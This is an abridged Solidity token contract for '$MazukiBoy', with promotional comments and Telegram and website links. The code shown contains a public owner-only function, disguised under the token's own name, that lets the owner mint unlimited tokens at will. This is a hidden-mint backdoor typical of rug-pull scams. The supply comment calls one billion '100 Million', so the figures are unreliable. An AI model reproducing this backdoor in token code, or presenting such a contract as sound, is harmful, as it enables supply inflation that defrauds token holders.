//
// $MazukiBoy proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/MazukiBoy
// 📱 Website ::https://mazukiboy.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MazukiBoy(uint256 amount) public onlyOwner {
 _MazukiBoy(msg.sender, amount);
    }
    ...
    function _MazukiBoy(address account, uint256 amount) internal virtual {
...
contract $MazukiBoy is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Mazuki Boy", "MAZUKIBOY") {
     _MazukiBoy(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}